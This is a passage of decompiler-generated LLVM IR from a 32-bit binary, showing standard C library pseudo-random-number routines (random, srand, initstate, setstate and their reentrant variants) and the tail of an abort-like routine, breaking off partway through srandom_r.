  %v2_804ae83 = phi i32 [ %v2_804ae834, %dec_label_pc_804ae4b ], [ %v1_804ae7b, %dec_label_pc_804ae5b ]
  %v0_804ae83 = phi i8 [ %v0_804ae4b, %dec_label_pc_804ae4b ], [ %v0_804ae83.pre, %dec_label_pc_804ae5b ]
  %v1_804ae83 = zext i8 %v0_804ae83 to i32
  %v3_804ae83 = and i32 %v2_804ae83, -256
  %v4_804ae83 = or i32 %v1_804ae83, %v3_804ae83
  store i32 %v4_804ae83, i32* %eax.global-to-local, align 4
  %v10_804ae88 = icmp eq i8 %v0_804ae83, 1
  %v1_804ae8a = icmp eq i1 %v10_804ae88, false
  br i1 %v1_804ae8a, label %dec_label_pc_804aee4, label %dec_label_pc_804ae8c

dec_label_pc_804ae8c:                             ; preds = %dec_label_pc_804ae83
  store i8 2, i8* @global_var_8052500.58, align 256
  %v2_804ae9b = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804ae9b, i32* %eax.global-to-local, align 4
  %v3_804aea0 = bitcast i32* %stack_var_-272 to i8*
  %v4_804aea0 = call i32 @__GI_memset(i8* %v3_804aea0, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aeb7

dec_label_pc_804aeb7:                             ; preds = %dec_label_pc_804aeb7.dec_label_pc_804aeb7_crit_edge, %dec_label_pc_804ae8c
  %v0_804aeb7 = phi i32 [ %v12_804ae12, %dec_label_pc_804ae8c ], [ %v0_804aeb7.pre, %dec_label_pc_804aeb7.dec_label_pc_804aeb7_crit_edge ]
  %v1_804aebf21 = phi i32 [ 31, %dec_label_pc_804ae8c ], [ %v1_804aebf, %dec_label_pc_804aeb7.dec_label_pc_804aeb7_crit_edge ]
  %v2_804aeb7 = mul i32 %v1_804aebf21, 4
  %v3_804aeb7 = add i32 %v2_804aeb7, 16
  %v4_804aeb7 = add i32 %v3_804aeb7, %v0_804aeb7
  %v5_804aeb7 = inttoptr i32 %v4_804aeb7 to i32*
  store i32 -1, i32* %v5_804aeb7, align 4
  %v0_804aebf.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804aebf = add i32 %v0_804aebf.pre, -1
  %v9_804aebf = icmp slt i32 %v1_804aebf, 0
  store i32 %v1_804aebf, i32* %eax.global-to-local, align 4
  %v1_804aec0 = icmp eq i1 %v9_804aebf, false
  br i1 %v1_804aec0, label %dec_label_pc_804aeb7.dec_label_pc_804aeb7_crit_edge, label %dec_label_pc_804aec2

dec_label_pc_804aeb7.dec_label_pc_804aeb7_crit_edge: ; preds = %dec_label_pc_804aeb7
  %v0_804aeb7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aeb7

dec_label_pc_804aec2:                             ; preds = %dec_label_pc_804aeb7
  store i32 %v2_804ae9b, i32* %eax.global-to-local, align 4
  %v4_804aed7 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804aed7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae5b

dec_label_pc_804aee4:                             ; preds = %dec_label_pc_804ae83
  %v10_804aee4 = icmp eq i8 %v0_804ae83, 2
  %v1_804aee6 = icmp eq i1 %v10_804aee4, false
  br i1 %v1_804aee6, label %dec_label_pc_804aef0, label %dec_label_pc_804aef0.thread

dec_label_pc_804aef0.thread:                      ; preds = %dec_label_pc_804aee4
  store i8 3, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804aef9

dec_label_pc_804aef0:                             ; preds = %dec_label_pc_804aee4
  %v9_804aef0 = icmp eq i8 %v0_804ae83, 3
  %v1_804aef7 = icmp eq i1 %v9_804aef0, false
  br i1 %v1_804aef7, label %dec_label_pc_804af0a, label %dec_label_pc_804aef9

dec_label_pc_804aef9:                             ; preds = %dec_label_pc_804aef0.thread, %dec_label_pc_804aef0
  store i8 4, i8* @global_var_8052500.58, align 256
  %v1_804af05 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804af0a:                             ; preds = %dec_label_pc_804aef0, %dec_label_pc_804af0a
  br label %dec_label_pc_804af0a

; uselistorder directives
  uselistorder i32 %v1_804aebf, { 2, 1, 0 }
  uselistorder i32 %v1_804ae22, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i8* @global_var_8052500.58, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804af0a, { 1, 0 }
  uselistorder label %dec_label_pc_804aef9, { 1, 0 }
  uselistorder label %dec_label_pc_804ae83, { 1, 0 }
  uselistorder label %dec_label_pc_804ae4b, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804af1e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804af1e, i32* @ebx, align 4
  %v2_804af23 = call i32 @__pthread_return_void(i32 %v2_804af1e, i32 134526403)
  %v1_804af2f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804af36 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804af40 = call i32 @__GI_random_r(i32* nonnull @global_var_805208c, i32 %v2_804af36)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804af4a = call i32 @__pthread_return_void(i32 %v2_804af1e, i32 1)
  %v3_804af4f = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_804af4f
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804af69 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804af69, i32* @eax, align 4
  %v2_804af6e = call i32 @__pthread_return_void(i32 %v2_804af69, i32 134526403)
  %v1_804af7a = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804af86 = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804af86, i32* @ebx, align 4
  %v3_804af90 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805208c)
  %v2_804af98 = icmp slt i32 %v3_804af90, 0
  br i1 %v2_804af98, label %dec_label_pc_804af9f, label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  br label %dec_label_pc_804af9f

dec_label_pc_804af9f:                             ; preds = %entry, %dec_label_pc_804af9c
  store i32 %v2_804af69, i32* @eax, align 4
  %v2_804afa8 = call i32 @__pthread_return_void(i32 %v2_804af69, i32 1)
  %v0_804afad = load i32, i32* @esi, align 4
  ret i32 %v0_804afad

; uselistorder directives
  uselistorder label %dec_label_pc_804af9f, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804afc4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804afc4, i32* @ebx, align 4
  %v2_804afc9 = call i32 @__pthread_return_void(i32 %v2_804afc4, i32 134526403)
  %v1_804afd5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804afdf = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804afdf, i32* @esi, align 4
  %v4_804aff1 = inttoptr i32 %arg2 to i32*
  %v5_804aff1 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804aff1, i32 %arg3, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 %v5_804aff1, i32* @eax, align 4
  %v2_804affc = call i32 @__pthread_return_void(i32 %v2_804afc4, i32 1)
  ret i32 ptrtoint (i32** @global_var_8052090.63 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b00c = load i32, i32* @ebx, align 4
  store i32 %v0_804b00c, i32* %stack_var_-4, align 4
  %v2_804b01a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b01a, i32* @ebx, align 4
  %v2_804b01f = call i32 @__pthread_return_void(i32 %v2_804b01a, i32 134526403)
  %v1_804b02b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804b03b = sext i32 %arg1 to i64
  %v3_804b03b = call i32 @srandom_r(i64 %v2_804b03b, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b045 = call i32 @__pthread_return_void(i32 %v2_804b01a, i32 1)
  %v2_804b04d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b04d, i32* @ebx, align 4
  ret i32 %v2_804b045

; uselistorder directives
  uselistorder i32* @global_var_805208c, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805208c to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_804b053 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_804b05f = add i32 %arg1, 4
  store i32 %v1_804b05f, i32* %esi.global-to-local, align 4
  %v1_804b062 = add i32 %tmp4, 12
  %v2_804b062 = inttoptr i32 %v1_804b062 to i32*
  %v3_804b062 = load i32, i32* %v2_804b062, align 4
  store i32 %v3_804b062, i32* %ecx.global-to-local, align 4
  %v1_804b065 = add i32 %tmp4, 8
  %v2_804b065 = inttoptr i32 %v1_804b065 to i32*
  %v3_804b065 = load i32, i32* %v2_804b065, align 4
  %v1_804b068 = icmp eq i32 %v3_804b062, 0
  %v1_804b06a = icmp eq i1 %v1_804b068, false
  br i1 %v1_804b06a, label %dec_label_pc_804b075, label %dec_label_pc_804b06c

dec_label_pc_804b06c:                             ; preds = %entry
  %v1_804b06c = add i32 %v3_804b065, -4
  %v2_804b06c = inttoptr i32 %v1_804b06c to i32*
  store i32 0, i32* %v2_804b06c, align 4
  br label %dec_label_pc_804b085

dec_label_pc_804b075:                             ; preds = %entry
  %v1_804b075 = add i32 %tmp4, 4
  %v2_804b075 = inttoptr i32 %v1_804b075 to i32*
  %v3_804b075 = load i32, i32* %v2_804b075, align 4
  %v2_804b078 = sub i32 %v3_804b075, %v3_804b065
  %v2_804b07a = sdiv i32 %v2_804b078, 4
  %v3_804b07d = mul i32 %v2_804b07a, 5
  %v2_804b080 = add i32 %v3_804b07d, %v3_804b062
  store i32 %v2_804b080, i32* %eax.global-to-local, align 4
  %v2_804b082 = add i32 %v3_804b065, -4
  %v3_804b082 = inttoptr i32 %v2_804b082 to i32*
  store i32 %v2_804b080, i32* %v3_804b082, align 4
  br label %dec_label_pc_804b085

dec_label_pc_804b085:                             ; preds = %dec_label_pc_804b06c, %dec_label_pc_804b075
  %v0_804b085 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b085 = add i32 %v0_804b085, -4
  %v2_804b085 = inttoptr i32 %v1_804b085 to i32*
  %v3_804b085 = load i32, i32* %v2_804b085, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804b08d = ashr i32 %v3_804b085, 31
  %v2_804b08e = zext i32 %v3_804b085 to i64
  %v4_804b08e = zext i32 %v1_804b08d to i64
  %v5_804b08e = mul nuw i64 %v4_804b08e, 4294967296
  %v6_804b08e = or i64 %v5_804b08e, %v2_804b08e
  %v8_804b08e = sdiv i64 %v6_804b08e, 5
  %v9_804b08e = trunc i64 %v8_804b08e to i32
  store i32 %v9_804b08e, i32* %eax.global-to-local, align 4
  %v10_804b08e = srem i64 %v6_804b08e, 5
  %v11_804b08e = trunc i64 %v10_804b08e to i32
  %v6_804b093 = icmp ugt i32 %v11_804b08e, 4
  br i1 %v6_804b093, label %dec_label_pc_804b0d3, label %dec_label_pc_804b095

dec_label_pc_804b095:                             ; preds = %dec_label_pc_804b085
  %v1_804b095 = mul i32 %v11_804b08e, 4
  %v2_804b095 = add i32 %v1_804b095, ptrtoint (i32* @global_var_8050354.64 to i32)
  %v3_804b095 = inttoptr i32 %v2_804b095 to i32*
  %v4_804b095 = load i32, i32* %v3_804b095, align 4
  store i32 %v4_804b095, i32* %ecx.global-to-local, align 4
  %v2_804b09c = add i32 %v1_804b095, ptrtoint (i32* @global_var_8050340.65 to i32)
  %v3_804b09c = inttoptr i32 %v2_804b09c to i32*
  %v4_804b09c = load i32, i32* %v3_804b09c, align 4
  store i32 %v4_804b09c, i32* %ebp.global-to-local, align 4
  %v1_804b0a3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0a3 = add i32 %v1_804b0a3, 16
  %v3_804b0a3 = inttoptr i32 %v2_804b0a3 to i32*
  store i32 %v4_804b095, i32* %v3_804b0a3, align 4
  %v0_804b0a6 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b0a6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0a6 = add i32 %v1_804b0a6, 20
  %v3_804b0a6 = inttoptr i32 %v2_804b0a6 to i32*
  store i32 %v0_804b0a6, i32* %v3_804b0a6, align 4
  %v1_804b0a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0a9 = add i32 %v1_804b0a9, 12
  %v3_804b0a9 = inttoptr i32 %v2_804b0a9 to i32*
  store i32 %v11_804b08e, i32* %v3_804b0a9, align 4
  %v1_804b0ac = icmp eq i32 %v11_804b08e, 0
  br i1 %v1_804b0ac, label %dec_label_pc_804b0c6, label %dec_label_pc_804b0b0

dec_label_pc_804b0b0:                             ; preds = %dec_label_pc_804b095
  %v0_804b0b0 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b0b0 = add i32 %v0_804b0b0, -4
  %v2_804b0b0 = inttoptr i32 %v1_804b0b0 to i32*
  %v3_804b0b0 = load i32, i32* %v2_804b0b0, align 4
  %v1_804b0b3 = ashr i32 %v3_804b0b0, 31
  %v0_804b0b4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804b0b4 = zext i32 %v3_804b0b0 to i64
  %v4_804b0b4 = zext i32 %v1_804b0b3 to i64
  %v5_804b0b4 = mul nuw i64 %v4_804b0b4, 4294967296
  %v6_804b0b4 = or i64 %v5_804b0b4, %v2_804b0b4
  %v7_804b0b4 = zext i32 %v0_804b0b4 to i64
  %v8_804b0b4 = sdiv i64 %v6_804b0b4, %v7_804b0b4
  %v9_804b0b4 = trunc i64 %v8_804b0b4 to i32
  %v2_804b0b6 = mul i32 %v9_804b0b4, 4
  %v3_804b0b6 = add i32 %v2_804b0b6, %v0_804b0b0
  %v1_804b0b9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b0b9 = add i32 %v1_804b0b9, %v9_804b0b4
  store i32 %v2_804b0b9, i32* %eax.global-to-local, align 4
  %v1_804b0bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0bb = add i32 %v1_804b0bb, 4
  %v3_804b0bb = inttoptr i32 %v2_804b0bb to i32*
  store i32 %v3_804b0b6, i32* %v3_804b0bb, align 4
  %v0_804b0be = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0be = ashr i32 %v0_804b0be, 31
  %v0_804b0bf = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b0bf = zext i32 %v0_804b0be to i64
  %v4_804b0bf = zext i32 %v1_804b0be to i64
  %v5_804b0bf = mul nuw i64 %v4_804b0bf, 4294967296
  %v6_804b0bf = or i64 %v5_804b0bf, %v2_804b0bf
  %v7_804b0bf = zext i32 %v0_804b0bf to i64
  %v8_804b0bf = sdiv i64 %v6_804b0bf, %v7_804b0bf
  %v9_804b0bf = trunc i64 %v8_804b0bf to i32
  store i32 %v9_804b0bf, i32* %eax.global-to-local, align 4
  %v10_804b0bf = srem i64 %v6_804b0bf, %v7_804b0bf
  %v11_804b0bf = trunc i64 %v10_804b0bf to i32
  %v0_804b0c1 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b0c1 = mul i32 %v11_804b0bf, 4
  %v3_804b0c1 = add i32 %v2_804b0c1, %v0_804b0c1
  %v1_804b0c4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0c4 = inttoptr i32 %v1_804b0c4 to i32*
  store i32 %v3_804b0c1, i32* %v2_804b0c4, align 4
  br label %dec_label_pc_804b0c6

dec_label_pc_804b0c6:                             ; preds = %dec_label_pc_804b095, %dec_label_pc_804b0b0
  %v0_804b0c6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b0c6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b0c6 = mul i32 %v1_804b0c6, 4
  %v3_804b0c6 = add i32 %v2_804b0c6, %v0_804b0c6
  store i32 %v3_804b0c6, i32* %eax.global-to-local, align 4
  %v1_804b0c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0c9 = add i32 %v1_804b0c9, 8
  %v3_804b0c9 = inttoptr i32 %v2_804b0c9 to i32*
  store i32 %v0_804b0c6, i32* %v3_804b0c9, align 4
  %v0_804b0cc = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0cc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0cc = add i32 %v1_804b0cc, 24
  %v3_804b0cc = inttoptr i32 %v2_804b0cc to i32*
  store i32 %v0_804b0cc, i32* %v3_804b0cc, align 4
  br label %dec_label_pc_804b0e1

dec_label_pc_804b0d3:                             ; preds = %dec_label_pc_804b085
  %v1_804b0d3 = call i32 @__errno_location(i32 %v0_804b053)
  store i32 %v1_804b0d3, i32* %eax.global-to-local, align 4
  %v1_804b0d8 = inttoptr i32 %v1_804b0d3 to i32*
  store i32 22, i32* %v1_804b0d8, align 4
  br label %dec_label_pc_804b0e1

dec_label_pc_804b0e1:                             ; preds = %dec_label_pc_804b0c6, %dec_label_pc_804b0d3
  %storemerge = phi i32 [ -1, %dec_label_pc_804b0d3 ], [ 0, %dec_label_pc_804b0c6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804b053, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804b0c6, { 1, 0 }
  uselistorder i32 %v11_804b08e, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_804b0e1, { 1, 0 }
  uselistorder label %dec_label_pc_804b0c6, { 1, 0 }
  uselistorder label %dec_label_pc_804b085, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804b0ec = load i32, i32* @ebx, align 4
  store i32 %v0_804b0ec, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804b0f5 = add i32 %tmp2, 8
  %v2_804b0f5 = inttoptr i32 %v1_804b0f5 to i32*
  %v3_804b0f5 = load i32, i32* %v2_804b0f5, align 4
  store i32 %v3_804b0f5, i32* %esi.global-to-local, align 4
  %v1_804b0f8 = add i32 %tmp2, 12
  %v2_804b0f8 = inttoptr i32 %v1_804b0f8 to i32*
  %v3_804b0f8 = load i32, i32* %v2_804b0f8, align 4
  %v4_804b0f8 = icmp eq i32 %v3_804b0f8, 0
  %v1_804b0fc = icmp eq i1 %v4_804b0f8, false
  br i1 %v1_804b0fc, label %dec_label_pc_804b115, label %dec_label_pc_804b0fe

dec_label_pc_804b0fe:                             ; preds = %entry
  %v2_804b0fe = inttoptr i32 %v3_804b0f5 to i32*
  %v3_804b0fe = load i32, i32* %v2_804b0fe, align 4
  %v5_804b0fe = mul i32 %v3_804b0fe, 1103515245
  %v1_804b104 = add i32 %v5_804b0fe, 12345
  %v1_804b109 = urem i32 %v1_804b104, -2147483648
  store i32 %v1_804b109, i32* %eax.global-to-local, align 4
  store i32 %v1_804b109, i32* %v2_804b0fe, align 4
  %v0_804b110 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b110 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b110 = inttoptr i32 %v1_804b110 to i32*
  store i32 %v0_804b110, i32* %v2_804b110, align 4
  br label %dec_label_pc_804b141

dec_label_pc_804b115:                             ; preds = %entry
  %v1_804b115 = add i32 %tmp2, 4
  %v2_804b115 = inttoptr i32 %v1_804b115 to i32*
  %v3_804b115 = load i32, i32* %v2_804b115, align 4
  store i32 %v3_804b115, i32* %ecx.global-to-local, align 4
  %v2_804b118 = load i32, i32* %arg1, align 4
  store i32 %v2_804b118, i32* %edx.global-to-local, align 4
  %v1_804b11a = add i32 %tmp2, 24
  %v2_804b11a = inttoptr i32 %v1_804b11a to i32*
  %v3_804b11a = load i32, i32* %v2_804b11a, align 4
  store i32 %v3_804b11a, i32* %edi.global-to-local, align 4
  %v1_804b11d = inttoptr i32 %v3_804b115 to i32*
  %v2_804b11d = load i32, i32* %v1_804b11d, align 4
  store i32 %v2_804b11d, i32* %eax.global-to-local, align 4
  %v1_804b11f = inttoptr i32 %v2_804b118 to i32*
  %v2_804b11f = load i32, i32* %v1_804b11f, align 4
  %v4_804b11f = add i32 %v2_804b11f, %v2_804b11d
  store i32 %v4_804b11f, i32* %v1_804b11f, align 4
  %v0_804b121 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b121 = inttoptr i32 %v0_804b121 to i32*
  %v2_804b121 = load i32, i32* %v1_804b121, align 4
  %v1_804b123 = add i32 %v0_804b121, 4
  store i32 %v1_804b123, i32* %edx.global-to-local, align 4
  %v2_804b126 = udiv i32 %v2_804b121, 2
  %v1_804b128 = load i32, i32* %edi.global-to-local, align 4
  %v7_804b128 = icmp ult i32 %v1_804b123, %v1_804b128
  %v1_804b12a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b12a = inttoptr i32 %v1_804b12a to i32*
  store i32 %v2_804b126, i32* %v2_804b12a, align 4
  %v0_804b12d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b12d = add i32 %v0_804b12d, 4
  store i32 %v1_804b12d, i32* %eax.global-to-local, align 4
  br i1 %v7_804b128, label %dec_label_pc_804b136, label %dec_label_pc_804b132

dec_label_pc_804b132:                             ; preds = %dec_label_pc_804b115
  %v0_804b132 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b132, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b13c

dec_label_pc_804b136:                             ; preds = %dec_label_pc_804b115
  %v1_804b136 = load i32, i32* %edi.global-to-local, align 4
  %v7_804b136 = icmp ult i32 %v1_804b12d, %v1_804b136
  br i1 %v7_804b136, label %dec_label_pc_804b13c, label %dec_label_pc_804b13a

dec_label_pc_804b13a:                             ; preds = %dec_label_pc_804b136
  %v0_804b13a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b13a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b13c

dec_label_pc_804b13c:                             ; preds = %dec_label_pc_804b136, %dec_label_pc_804b132, %dec_label_pc_804b13a
  %v0_804b13c = load i32, i32* %edx.global-to-local, align 4
  %v1_804b13c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b13c = inttoptr i32 %v1_804b13c to i32*
  store i32 %v0_804b13c, i32* %v2_804b13c, align 4
  %v0_804b13e = load i32, i32* %eax.global-to-local, align 4
  %v1_804b13e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b13e = add i32 %v1_804b13e, 4
  %v3_804b13e = inttoptr i32 %v2_804b13e to i32*
  store i32 %v0_804b13e, i32* %v3_804b13e, align 4
  br label %dec_label_pc_804b141

dec_label_pc_804b141:                             ; preds = %dec_label_pc_804b0fe, %dec_label_pc_804b13c
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804b143 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b143, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804b109, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b141, { 1, 0 }
  uselistorder label %dec_label_pc_804b13c, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804b148 = load i32, i32* @ebp, align 4
  %v0_804b149 = load i32, i32* @edi, align 4
  %v0_804b14a = load i32, i32* @esi, align 4
  %v0_804b14b = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_804b156 = trunc i64 %arg1 to i32
  store i32 %v4_804b156, i32* %eax.global-to-local, align 4
  %v1_804b15a = add i32 %arg2, 12
  %v2_804b15a = inttoptr i32 %v1_804b15a to i32*
  %v3_804b15a = load i32, i32* %v2_804b15a, align 4
  store i32 %v3_804b15a, i32* %edx.global-to-local, align 4
  %v6_804b160 = icmp ugt i32 %v3_804b15a, 4
  br i1 %v6_804b160, label %dec_label_pc_804b1d4, label %dec_label_pc_804b162

dec_label_pc_804b162:                             ; preds = %entry
  %v1_804b162 = add i32 %arg2, 8
  %v2_804b162 = inttoptr i32 %v1_804b162 to i32*
  %v3_804b162 = load i32, i32* %v2_804b162, align 4
  store i32 %v3_804b162, i32* %ebx.global-to-local, align 4
  %v1_804b165 = icmp eq i32 %v4_804b156, 0
  %v1_804b167 = icmp eq i1 %v1_804b165, false
  br i1 %v1_804b167, label %dec_label_pc_804b16b, label %dec_label_pc_804b169

dec_label_pc_804b169:                             ; preds = %dec_label_pc_804b162
  %v1_804b169 = and i32 %v4_804b156, -256
  %v2_804b169 = or i32 %v1_804b169, 1
  store i32 %v2_804b169, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b16b

dec_label_pc_804b16b:                             ; preds = %dec_label_pc_804b162, %dec_label_pc_804b169
  %v0_804b16b = phi i32 [ %v4_804b156, %dec_label_pc_804b162 ], [ %v2_804b169, %dec_label_pc_804b169 ]
  %v2_804b16b = inttoptr i32 %v3_804b162 to i32*
  store i32 %v0_804b16b, i32* %v2_804b16b, align 4
  %v1_804b16d = icmp eq i32 %v3_804b15a, 0
  br i1 %v1_804b16d, label %dec_label_pc_804b1d2, label %dec_label_pc_804b171

dec_label_pc_804b171:                             ; preds = %dec_label_pc_804b16b
  %v0_804b171 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804b171, i32* %edx.global-to-local, align 4
  %v0_804b173 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b173, i32* %ecx.global-to-local, align 4
  %v0_804b175 = load i32, i32* @esi, align 4
  %v1_804b175 = add i32 %v0_804b175, 16
  %v2_804b175 = inttoptr i32 %v1_804b175 to i32*
  %v3_804b175 = load i32, i32* %v2_804b175, align 4
  store i32 %v3_804b175, i32* %eax.global-to-local, align 4
  %v4_804b17d = sext i32 %v3_804b175 to i64
  store i64 %v4_804b17d, i64* %stack_var_-40, align 8
  %v5_804b1af28 = icmp sgt i32 %v3_804b175, 1
  br i1 %v5_804b1af28, label %dec_label_pc_804b182, label %dec_label_pc_804b1b1

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b171, %dec_label_pc_804b182.dec_label_pc_804b182_crit_edge
  %v0_804b1a6 = phi i32 [ %v0_804b1a6.pre, %dec_label_pc_804b182.dec_label_pc_804b182_crit_edge ], [ %v0_804b173, %dec_label_pc_804b171 ]
  %v0_804b182 = phi i32 [ %v0_804b182.pre, %dec_label_pc_804b182.dec_label_pc_804b182_crit_edge ], [ %v0_804b171, %dec_label_pc_804b171 ]
  %v0_804b1a929 = phi i32 [ %v0_804b1ac.pre, %dec_label_pc_804b182.dec_label_pc_804b182_crit_edge ], [ 1, %dec_label_pc_804b171 ]
  %v1_804b189 = ashr i32 %v0_804b182, 31
  %v2_804b18a = zext i32 %v0_804b182 to i64
  %v4_804b18a = zext i32 %v1_804b189 to i64
  %v5_804b18a = mul nuw i64 %v4_804b18a, 4294967296
  %v6_804b18a = or i64 %v5_804b18a, %v2_804b18a
  %v8_804b18a = sdiv i64 %v6_804b18a, 127773
  %v9_804b18a = trunc i64 %v8_804b18a to i32
  %v10_804b18a = srem i64 %v6_804b18a, 127773
  %v3_804b190 = mul nsw i64 %v10_804b18a, 16807
  %v4_804b190 = trunc i64 %v3_804b190 to i32
